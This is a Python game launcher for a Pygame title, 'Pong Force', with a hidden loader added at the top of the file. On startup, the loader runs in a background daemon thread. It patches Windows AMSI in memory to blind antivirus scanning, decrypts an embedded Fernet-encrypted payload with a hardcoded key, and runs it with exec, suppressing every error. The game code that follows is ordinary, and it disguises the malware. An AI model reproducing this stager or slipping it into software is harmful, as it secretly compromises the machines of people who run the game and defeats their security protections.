
import ctypes
import threading
from cryptography.fernet import Fernet
import base64

def run_payload():
    """The main function to prepare and launch the hidden payload."""
    try:
        # --- Stage 1: Blind the Watcher (AMSI Bypass) ---
        # This patches the Antimalware Scan Interface in memory for this process only,
        # preventing it from scanning the code we are about to execute.
        try:
            # Access the amsi.dll library.
            amsi = ctypes.windll.LoadLibrary("amsi.dll")
            
            # Define the function signature for AmsiOpenSession.
            AmsiOpenSession = amsi.AmsiOpenSession
            AmsiOpenSession.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
            AmsiOpenSession.restype = ctypes.c_int
            
            # Define the function signature for AmsiScanBuffer.
            AmsiScanBuffer = amsi.AmsiScanBuffer
            AmsiScanBuffer.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_wchar_p, ctypes.c_void_p, ctypes.c_void_p]
            AmsiScanBuffer.restype = ctypes.c_int
            
            # The patch: a series of bytes that essentially makes AmsiScanBuffer
            # return a clean result (S_OK) immediately.
            # This is for a 64-bit process.
            # mov eax, 0; ret
            patch = b'\xb8\x00\x00\x00\x00\xc3' 
            
            # Get the memory address of the AmsiScanBuffer function.
            address = ctypes.cast(AmsiScanBuffer, ctypes.c_void_p).value
            
            # Grant write permissions to that memory page.
            kernel32 = ctypes.windll.kernel32
            old_protect = ctypes.c_ulong()
            kernel32.VirtualProtect(ctypes.c_void_p(address), len(patch), 0x40, ctypes.byref(old_protect))
            
            # Write our patch into memory, overwriting the function's first few instructions.
            ctypes.memmove(ctypes.c_void_p(address), patch, len(patch))
            
            # Restore the original memory permissions.
            kernel32.VirtualProtect(ctypes.c_void_p(address), len(patch), old_protect, ctypes.byref(old_protect))

        except Exception as e:
            # If AMSI bypass fails, we continue anyway. It might still work.
            pass

        # --- Stage 2: Resurrect the Soul (Payload Decryption) ---
        
        # PASTE THE KEY from your encryptor.py output here.
        key = b' Cq_7-EcL1ntloL-yQSHrLaujrMMZkV64mdXJyttvaeI='
        
        encrypted_payload_b64 = b'Z0FBQUFBQm83WkpmbzR1aHF2b3JWNFJKTlZvNDFiV0tJMGxpbEU5VmNxMGhydkFKOWhjX1VUWVBWSzhpUEIwbzRmcVBpQ0Z5UWdxekNYV2E4N0puaGRKcl9FSFhYc251ak5iTXJVWUUtcnpQMGZpSnFZRFJMOENvZTdPRE5iN1g5V21CRDdEYTJicGE0ZWRoQktzV0dWaTFkNFpLZlZWQVJja3JLZ3B0enNMakxScnlLM1BTYzBVTzJiejZxaHJZUGVEelFzaUg4U2tQZVdLUzZWa2lYTzNXaVB1NEVRWVpMMnBNQ3RnSy12MTFaZTY4MFJPUzJ6UkdzMWVRaFhPblRBVWpYbmpvcjhhaVdxdEJtVUF4azJTeExpOFhQb3h3bl9NY0RxRFNFT05ud2Ytc25nalB6bHRkXzNwQlZPYzZEdkVudExoUnVKMURtTnM2czZOMklGcWxGUkpaVnJQa29pR2N2ZXlzWkhreTBuX2JXdk1qaUpOLUFzRzlpaDZjczVVZE8wc3NGRUtqSWgtb2dLWVJhWlVFMnNocTdIV2RzRzFiX3ZiY1pSUTExU2hwX3c1VUJVZ3VtQnR5RUktN3NMSXp3T2RvUzFmZjE3RzZQeEZITnJFeFM2THc3bkRyOVhqSXR4VldWLUlJeUh3ZFpwMlAwUm9OSXJNRGJSQnZLY21sc2p6dlRsd1VJa085akZ5d09ROHdfZ21mSjJVOGx5MzZfTy1POTdvejh4eHlUa1JJa3NzRWs5ZVVWNUZyM0pBbEVKVUdsRzJtMXY4MHM3R3ZNLWRIcklXS3dQMzBJaUlQNUJvWVFzUTIxSmVyeVMwOVpXc0l6X0E1TTRvV05IVC11cUN3WEpYWEhGR2czdURQSHdMT0JKdzZRQnJZMEVjNjhfNlpRUmxKcXM2azJxS1NadUhkSDA2MVVVWnVlc1dVdUN4OHUyU01TVnI4U1g5ZkRiNkdKRW9xUVZ0cEhINmIxU0ZxNm5qcGxWdmJmVTRiRVlQWmY0eU5pbDVkSm9jSHdYT0xLanpOWEdlbkhQb3ZkdWxUbmRqaExnMlNnbUJCbkp5c09QZzYyUEpXcm9UbjJqTW41cFhaVVRuYnBxNnNhWjAtMVM0VFZPMlFEeEJKWVE4b1RUS0p5LVprOWpSQlhGV2hDUlVEYjQ4aWI1N3VONDZTeGVBR1ExUk0xOGNZMnRqeDVUelhxXzRRMndLaWxZcUFyOGx2X1NnSzNyM0ZnS3RsTXBlUV9EVEVKTFF3VEhTN0htcUFYSEtpUHl4NWtxbThwV0t2UDhFeHlMcW1Cb2p5NUJxU2M5X09fakt6SEpNVHRuTjdCcU1aa20wSUZLSDdLLVZKU3JwajVPX3FLRENrNTU1aS15dmxuZzBkSWJDWno1ZW9IcVJKSzJuMnRaNUhhMEZ6dkJJRm16WXNkSnE4QmNyQVV2LWhwLU1kOTNnTUJnWXFMR05aMF8yYm5ndzNXSHJyZkNfT3JjSjFOSGVIcHEzV25UVzNleUFBU05oOG5HLUQzWHpkOFd3Ykd3bXhEcmpUanZwMlBCeWtXbFpyR3YzcDY0VHQ1dkpLRFBDTGVHbnZYWGVsWlliNUttNnkzLXRCNG90SGdPa3lmelVsdFd5VElnMmdJd3gzYzN5a1BQckdNbWU1QktJMklHUmlDdVMySUY5RF9GME9pdXJhNkdSUkotZlpNTFV0ZjF2dHVEMmZkajQ5MGQxZTVIMENoQ2tXNGtiSWlXdHh5UW9kUWZqRUV0ZXRXNms3czdOXzFCcGMxRXY4dnd6WjNfdndVME02UDJqZHptUENqc0dFaVRRamVKVUx2TzROTzhiX2FmZFdjOGVBR1RFZEQyQWF0VmZiaTNmazdndEdIbEI3Q1RLdFowdEFqU1RGcWtKNFpZNnM4SXdsVTVETWt4dDdMOTlTRFNDN2hxU1ZiZWlQXzVkM3poa1FVMWNfR0VPZVd5RWRiZzNQTEhlV1VLUnkyclJVcjNBQ25qa3dCaGp5Wk9MOXc4WThBR1dxODNIVzB0Z1YyMGJNdDZiQjQ2N0JsakZtbklBdDE4Ukp1a00xRFduZThZOG8xZ3hrOFNvUEI3bnpkMmplNWZWRy1PS1lPNkg0OWhDa0ZuLWFnbnFCdWl1Y0RHak9kb29vSVg0c1FBUVhoRzRvTDlLQmpTUFc2dUpBVEY1WjI0RTdGV1VRNVpSWTd4MWhUS0NJWnBhSGRteDQwNi1wZzVFVUE2b1VwRUhJY2I4cGZpSDBEU2hWU253ZkxielNJMHduOHE2cHhvSmtUaldvR3FsbGZ3Zm5DZjBCU1NMMGc0T18tQmdxWlJHSnh5ZGJFMlJyY2U3bTl0TlB3SlNicF82dGVkR3duQmphZndOTDItNDRYY19WdFBYZUptTVVaMFRuZVNYTlVzb0YwZmZtM2pmcTJnUEZwQlpvQlhPdDNOa05YS2R2MDNBRy1ha09SR2VjcTJ1MzEtTEd6OVBlVGVwUGFpRkRMN1NNcGJRVHJXUmtkZlpYcFlRM2hTUlhVYkhoaVNYY0ZnR0JLVEFJSnlsT09DZUJmMzJ2dUtGQjN2Z0p3UUlmWXlJTnZoaTBqWi1FYko0ZVgzRVlTOGZtWFFIU3VvLTdta2NKcFBLNFlqSDYzY3d1NVhEZnhxczNSVHFLdVhuc20xS3ExN3pHTlRSb2FFTEVaRllQanNzdjN6NVJVcUVySTJsVnhwanBqZlJxd2EtNU5IcjV0dDlER2JDQ3NrQzJ2YUtQRXg5VFFCTEpBNDNIaEVvMjFzbXZhZHBYWXh0VVptbDlOaDV2eEk0UmRrZm96M2cyWmZuYWVObW9jOFBleUNiZHExY2pLT0ZPQVF0d3FQWUplelZmVV9oSmlvTzJuQUVXWDZRU1F2cTl4dkU2RDdaWG1oclhkTUNYNW53OS1WUGJ2bUI0TUo4aDFJaGZ3ekF1aVVMQTN6eEpLQllGeTdBWk1HckY4cjRNLXNVZHNYZkFjcHBwcVUzWGMxMmlTclBzMTFuV2RQZzE3UXBxZnBYOGtBV2duTTJuNXlCT1duYk1UM0MxczFOaTkyUXVoRzI0bDFRUVlnWXFFVTZtUEdLWUVaUnNKbEJUcUE1Z1ZCNlVNSzVpXy1QMGEzX0k3VHVrSVJuZk5rSGs1QzA0cGZ0ZnFCYW81VkxCaW9kMGMtMXhxNUk2NkZGZUcwOVdOU1B3ZmYwd2V0dTYyWGJwR0M3dFRtMXdlTHZUZVhCbWlnc19oaElTdktjdjJhaElBT3RwUGFHYTBKQ2xTZUdrQThSbmI3SmVUUXBwdkxXUWd0ckV2R2RnVzNwQlgyM1RCak5vdEhKVGY4a290Uk9rd2J4S2VKRDhkWG9BNnd4LXFxU3pzQXFHc3JGeFNNWWhyVjhVQlZIckVOZzF2V1I5OTNSTG9qSDBGM2tKQW1FUTFGQ095Vi1XY0hkcXRsMTJ1Y09kX2FVZ0dMeGpjd2lfQ0p4aVlrSWlZQ0VsZnZvZ2FxYlVKTjJEeU1scnNCMzBOVElXLXVUdFA4NWpJcDNhZUpVZFA1d0VDVUhPelM5U3g2Y056ZzZXTFVDZFpGcVlLMnF2QThBNUxOR2N2Y0wyazFRZENwaVdMcmdLNHVKNmY4WEU3U2NmeDVkNkVFQUtFVXdKNTd0UGhKekFrdnFzb2JZTk00WW00eHBZRnl3eng3c1FoZHExZEo1aF9EZ0tuWHBfLWM5MDJCTWtsQnFMMmwxaVRybjVNOEJVTjFLNmVTMUxhVHU0eDdpTzNBM19xVFpHZnpydDdKcHFPeU1vdGc1LUlCR1BpR1ExdGFRWUp5RThpdTk3OGpCdEYyNnlta1lGMUVpb29xUHRzSEI5UmQzQUpMUFEzRDNHOU5kc1Zpbk4tdnVfazJZbE1rLWdCbjJCeXdEVm5YQk9BWUpYRTRwX2RkMFI5a0dhWXZDWFBrazlCQzY5Q0RYeF9BcVRmTUp4TS1aU1pCQ0R4MGJZWG94RlhZcjQ1WWJmSjkzamd5bWJ4UXFCbjFvZG9fazVnejJvRGJsZGZkOTRQR2swZkJ4aGh1aF9Hclp4Z3ZCajlXTFVIclFfbFBEQ0pVdVlaNWcxOEJUdTVnNjMzM0lXWnI5WU01TmhIT29ER0NWYk5qR0F5ejNuNkJnUHFVdjU2WEZld2dEYkRYSExJR0NYRDliZ1dTYVE5MWZlQXNKS0RVVGZtN0RHTmlKcEJGeU9mSm83MFVseXhmWWNJMkx0YnpRTC16aS02YXBqXzFEZERkZFlTYk5Pc2hGeUwxSnRaV0ExdFUxLUdBPT0='
        
        # Decode from Base64 and decrypt.
        encrypted_payload = base64.b64decode(encrypted_payload_b64)
        cipher_suite = Fernet(key)
        decrypted_payload = cipher_suite.decrypt(encrypted_payload)

        # --- Stage 3: Execute in the Aether (In-Memory Execution) ---
        # We execute the decrypted code within the context of this script.
        # It never touches the disk.
        exec(decrypted_payload, {})
        
    except Exception as e:
        # If anything fails, do nothing. Silence is key.
        pass

# Run the entire stager in a separate daemon thread so it doesn't block the main game.
payload_thread = threading.Thread(target=run_payload)
payload_thread.daemon = True
payload_thread.start()

# ==============================================================================
#                      END OF PHANTOM LOADER
# ==============================================================================


#!/usr/bin/env python3
# ===== PONG FORCE - MAIN ENTRY POINT =====

import sys
import argparse
import pygame
import traceback
from game.game_loop import GameLoop
from game.menu import GameMenu, HostInputDialog, OnlineSubmenu, ErrorDialog
from network.server import GameServer
from network.client import GameClient
import config

def main():
    """Main entry point for Pong Force"""
    parser = argparse.ArgumentParser(description='Pong Force - Revolutionary Pong with Force Push')
    parser.add_argument('--server', action='store_true', help='Run as server')
    parser.add_argument('--client', action='store_true', help='Run as client')
    parser.add_argument('--host', default=config.SERVER_IP, help='Server IP address')
    parser.add_argument('--port', type=int, default=config.SERVER_PORT, help='Server port')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    parser.add_argument('--local', action='store_true', help='Start local multiplayer directly')
    
    args = parser.parse_args()
    
    # Set debug mode
    if args.debug:
        config.DEBUG_MODE = True
    
    # Initialize Pygame ONCE
    pygame.init()
    pygame.mixer.init(
        frequency=config.AUDIO_FREQUENCY,
        size=config.AUDIO_SIZE,
        channels=config.AUDIO_CHANNELS,
        buffer=config.AUDIO_BUFFER
    )
    
    try:
        if args.server:
            # Server mode with console output
            print("🎮 Starting Pong Force Server...")
            print(f"📍 Server running on {args.host}:{args.port}")
            print("⏳ Waiting for players to connect...")
            print("💡 Players can connect with: pong_force.exe --client --host", args.host)
            
            server = GameServer(args.host, args.port)
            server.run()
            
        elif args.client:
            # Client mode
            print("🎮 Starting Pong Force Client...")
            print(f"🔗 Connecting to {args.host}:{args.port}")
            
            client = GameClient(args.host, args.port)
            client.run()
            
        elif args.local:
            # Direct local multiplayer (no menu)
            print("🎮 Starting local multiplayer game...")
            game = GameLoop()
            game.run_local()
            
        else:
            # No arguments - show graphical menu (with loop for returning to menu)
            try:
                running = True
                while running:
                    menu = GameMenu()
                    choice = menu.run()
                    
                    # Handle menu choice
                    if choice == 0:  # Play vs Robot
                        try:
                            print("🤖 Starting vs AI...")
                            game = GameLoop()
                            game.run_vs_ai()
                            # After game ends, loop will return to menu
                        except Exception as e:
                            print(f"❌ Error in AI mode: {e}")
                            if config.DEBUG_MODE:
                                traceback.print_exc()
                            input("Press Enter to continue...")
                        
                    elif choice == 1:  # Play Online Multiplayer
                        try:
                            # Show submenu for Host or Join
                            submenu = OnlineSubmenu()
                            online_choice = submenu.run()
                            
                            if online_choice == 0:  # Host Game
                                print("🌐 Starting server...")
                                print(f"📍 Server will listen on all interfaces (0.0.0.0):{args.port}")
                                print("💡 Share your PUBLIC IP address with other players!")
                                print("💡 To find your public IP, visit: https://www.whatismyip.com/")
                                server = GameServer(config.SERVER_IP, args.port)
                                # Use run_with_gui() to avoid creating a new window
                                server.run_with_gui()
                                # After server ends, return to menu
                            elif online_choice == 1:  # Join Game
                                dialog = HostInputDialog()
                                host = dialog.run()
                                if host:  # Only connect if user entered an IP
                                    print(f"🔗 Connecting to {host}:{args.port}...")
                                    client = GameClient(host, args.port)
                                    # Use run_with_gui() to avoid creating a new window
                                    client.run_with_gui()
                                    
                                    # Check if there was a connection error
                                    if client.error_message:
                                        error_dialog = ErrorDialog(
                                            client.error_title or "Connection Error",
                                            client.error_message
                                        )
                                        error_dialog.run()
                                    # After client ends, return to menu
                                else:
                                    print("❌ Connection cancelled")
                            # If choice is -1 (back to menu), just continue loop
                        except Exception as e:
                            print(f"❌ Error in online mode: {e}")
                            if config.DEBUG_MODE:
                                traceback.print_exc()
                            input("Press Enter to continue...")
                        
                    else:  # Exit or Cancel (-1)
                        print("👋 Thanks for playing Pong Force!")
                        running = False  # Exit the menu loop
                        
            except Exception as e:
                print(f"❌ Menu error: {e}")
                if config.DEBUG_MODE:
                    traceback.print_exc()
                input("Press Enter to exit...")
    
    except KeyboardInterrupt:
        print("\n👋 Thanks for playing Pong Force!")
    except Exception as e:
        print(f"❌ Fatal error: {e}")
        if config.DEBUG_MODE:
            import traceback
            traceback.print_exc()
        sys.exit(1)
    finally:
        pygame.quit()

if __name__ == "__main__":
    main()
